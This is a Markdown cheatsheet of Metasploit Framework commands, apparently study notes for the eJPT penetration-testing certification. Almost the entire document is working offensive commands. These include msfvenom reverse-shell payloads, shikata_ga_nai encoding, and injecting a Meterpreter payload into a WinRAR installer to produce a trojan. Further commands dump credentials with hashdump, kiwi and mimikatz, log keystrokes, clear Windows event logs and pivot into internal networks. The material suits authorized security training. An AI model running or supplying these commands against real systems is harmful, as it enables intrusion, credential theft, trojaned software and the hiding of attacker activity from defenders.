---
title: Metasploit Framework Cheatsheet
tags: [eJPT, Cheatsheet, Metasploit, Meterpreter, MSF, msfvenom]
created: 2026-06-02
source: Transcripts
---

# Metasploit Framework Cheatsheet

**Related:** [[File-Transfer-Methods]] | [[Meterpreter-Fundamentals]] | [[Msfvenom-Payloads]] | [[Resource-Scripts]] | [[Pivoting]] | [[00-INDEX]]

---

## Setup

```bash
service postgresql start
msfconsole

db_status          # Confirm DB connected (postgresql)
```

---

## Workspaces & DB

```bash
workspace                        # List workspaces
workspace -a <name>              # Create + switch to workspace
workspace <name>                 # Switch to existing workspace
workspace -d <name>              # Delete workspace

# Scan and auto-save to DB
db_nmap -sS -sV -O <target-ip>

# Import existing Nmap XML
db_import /path/to/scan.xml

# Review stored data
hosts
services
vulns

# Global target variable (persists between modules)
setg RHOSTS <target-ip>
setg RHOST <target-ip>
```

---

## Search & Module Selection

```bash
search <keyword>
search type:exploit name:smb
search cve:2017
search mysql 5.5
search type:auxiliary name:scanner

use <module_path>
use 0                  # Use by search result index
info                   # Show description, targets, options
back                   # Return to main prompt

show options
show advanced
show payloads          # Compatible payloads for current module
show targets
```

---

## Setting Options

```bash
set RHOSTS 192.168.1.10
set RHOSTS 192.168.1.0/24
set RHOSTS file:/tmp/hosts.txt
set LHOST 192.168.1.5
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGET 0
```

---

## Running Exploits

```bash
run           # Run module
exploit       # Same as run
check         # Check if target is vulnerable (if supported)
run -j        # Run as background job

jobs          # List running jobs
kill <id>     # Kill a job
```

---

## Session Management

```bash
sessions              # List all sessions
sessions <id>         # Interact with session
sessions -i <id>      # Same
background            # Background current session (also Ctrl+Z)
sessions -k <id>      # Kill session
sessions -K           # Kill all sessions
sessions -n victim1 -i 1     # Rename session
sessions -c "sysinfo" -i 1   # Run command without interacting

# Upgrade command shell → Meterpreter
sessions --upgrade <id>
# or:
use post/multi/manage/shell_to_meterpreter
set SESSION <id>
set LHOST eth1
run
```

---

## Meterpreter — Core Commands

### System Info
```bash
sysinfo               # OS, hostname, arch, payload type
getuid                # Current user
getprivs              # Token privileges
getpid                # Current PID
ps                    # List processes
```

### File System
```bash
pwd / ls / cd <dir>
cat <file>
edit <file>
download <file>                           # Download to Kali
upload /opt/tool.exe C:\\Temp\\tool.exe   # Upload to target
search -f *.php                           # Search by extension
search -d /usr/bin -f backdoor*
checksum md5 /bin/bash
```

### Shell & Execution
```bash
shell                          # Drop to OS shell
execute -f ipconfig            # Run command directly
```

### Process & Privileges
```bash
migrate <PID>
migrate -n explorer.exe
getsystem                      # Auto privesc (token impersonation)
```

### Windows-Only
```bash
hashdump                       # Dump NTLM hashes from SAM
load kiwi                      # Load Mimikatz extension
creds_all                      # Dump all credentials
lsa_dump_sam
lsa_dump_secrets

load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"

keyscan_start / keyscan_dump / keyscan_stop
screenshot
clearev                        # Clear Windows event logs
show_mount
run post/windows/manage/migrate
```

---

## Credential Dumping

### Kiwi (Meterpreter — requires SYSTEM + migrated to LSASS)
```bash
pgrep lsass
migrate <lsass_pid>
getuid                # Should show NT AUTHORITY\SYSTEM

load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```

### Mimikatz Executable
```bash
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Temp\\mimikatz.exe
shell
# Inside mimikatz:
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
exit
```

### Linux hashdump
```bash
use post/linux/gather/hashdump
set SESSION <id>
run
loot                           # View saved loot path
```

---

## Post-Exploitation Modules

```bash
use post/multi/recon/local_exploit_suggester   # Find privesc vectors
use post/windows/gather/hashdump
use post/windows/gather/enum_shares
use post/windows/gather/credentials/credential_collector
use post/linux/gather/enum_configs
use post/linux/gather/enum_system
```

---

## Pivoting

```bash
# 1. In Meterpreter on Victim 1 — add route to internal network
run autoroute -s <victim1_internal_subnet>/20
background

# 2. Scan Victim 2 through route (MSF modules only)
use auxiliary/scanner/portscan/tcp
set RHOSTS <victim2_internal_ip>
set PORTS 1-100
run

# 3. Port forward for external tools (nmap, browser)
sessions <id>
portfwd add -l 1234 -p 80 -r <victim2_internal_ip>
background
db_nmap -sV -p 1234 127.0.0.1

# 4. Exploit Victim 2 — use BIND payload (not reverse) through pivot
set PAYLOAD windows/meterpreter/bind_tcp
```

---

## Vulnerability Scanning

```bash
# Check auxiliary (verify vulnerable)
use auxiliary/scanner/smb/smb_ms17_010
run

# ExploitDB search outside MSF
searchsploit Microsoft Windows SMB | grep -i metasploit

# db_autopwn (deprecated but functional)
load db_autopwn
db_autopwn -p -t              # Match modules to all open ports
db_autopwn -p -t -PI 445     # Limit to port 445
```

---

## msfvenom — Payload Generation

```bash
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders

# Windows 32-bit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -f exe -o payload_x86.exe

# Windows 64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -f exe -o payload_x64.exe

# Linux 32-bit
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -f elf -o payload_x86
chmod +x payload_x86

# Linux 64-bit
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -f elf -o payload_x64

# Encode (x86/shikata_ga_nai — 10 iterations)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Inject into legit exe (-x template, -k keeps original behaviour)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x winrar-setup.exe -o WinRAR.exe
```

> Staged = `/` in name (e.g. `reverse_tcp`). Non-staged = `_` (e.g. `meterpreter_reverse_tcp`).

---

## Multi/Handler

```bash
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
run -j
```

---

## Resource Scripts

```bash
# Load .rc file at startup
msfconsole -r handler.rc

# Load from within MSF
resource /root/Desktop/handler.rc

# Export current session commands to .rc file
makerc /root/Desktop/session.rc
```

**Example handler.rc:**
```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```

---

## Key Shortcuts

| Action | Command |
|---|---|
| Background session | `background` or `Ctrl+Z` |
| List sessions | `sessions` |
| Re-interact | `sessions <id>` |
| Clear screen | `clear` |
| Exit MSF | `exit` |
